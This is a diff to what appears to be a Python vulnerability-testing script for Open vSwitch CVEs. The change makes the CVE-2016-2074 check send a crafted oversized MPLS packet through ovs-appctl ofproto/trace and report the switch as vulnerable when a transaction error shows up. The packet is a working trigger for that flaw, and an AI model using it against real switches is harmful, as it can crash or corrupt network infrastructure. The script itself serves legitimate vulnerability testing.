@@ -8,9 +8,18 @@ from mininet_setup import MininetNetwork
 
 def cve_2016_2074():
     os.system('sudo ovs-vsctl add-br br0')
-    os.system('sudo ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)')
+   
+    mpls = 'sudo ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)'
+    process = subprocess.Popen(mpls, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+    output, _ = process.communicate()
 
     os.system('sudo ovs-vsctl del-br br0')
+
+    vulnerable = False
+    if 'ovs-vswitchd: transaction error' in output:
+        vulnerable = True
+
+    return vulnerable
 
 def cve_2016_10377():
 
@@ -74,7 +83,8 @@ def cve_2023_1668():
 
 # This is for testing purposes:
 if __name__ == '__main__':
-    #cve_2016_2074()
-    test = cve_2016_10377()
+    test = cve_2016_2074()
+    #test = cve_2016_10377()
+    #cve_2022_32166()
     print(test)
-    #cve_2022_32166()  
+  
